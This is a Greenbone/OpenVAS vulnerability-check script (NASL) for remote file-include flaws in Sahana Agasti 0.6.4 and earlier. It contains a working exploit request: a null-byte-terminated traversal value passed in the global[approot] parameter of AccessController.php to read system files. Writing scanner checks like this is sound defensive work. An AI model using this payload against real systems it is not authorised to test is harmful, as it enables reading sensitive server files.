if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103013" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2011-01-05 15:07:33 +0100 (Wed, 05 Jan 2011)" );
	script_bugtraq_id( 45656 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_name( "Sahana Agasti Multiple Remote File Include Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "sahana_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "sahana/detected" );
	script_tag( name: "summary", value: "Sahana Agasti is prone to multiple remote file-include
  vulnerabilities because the application fails to sufficiently sanitize user-supplied input." );
	script_tag( name: "impact", value: "Exploiting these issues may allow a remote attacker to obtain
  sensitive information or to execute arbitrary script code in the context of the webserver process.
  This may allow the attacker to compromise the application and the underlying computer. Other attacks
  are also possible." );
	script_tag( name: "affected", value: "Sahana Agasti 0.6.4 and prior versions are vulnerable." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/45656" );
	script_xref( name: "URL", value: "https://launchpad.net/sahana-agasti/" );
	script_xref( name: "URL", value: "http://www.sahanafoundation.org/" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
CPE = "cpe:/a:sahana:sahana";
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for file in keys( files ) {
	url = NASLString( dir, "/mod/vm/controller/AccessController.php?global[approot]=/", files[file], "%00" );
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( url: url, port: port );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

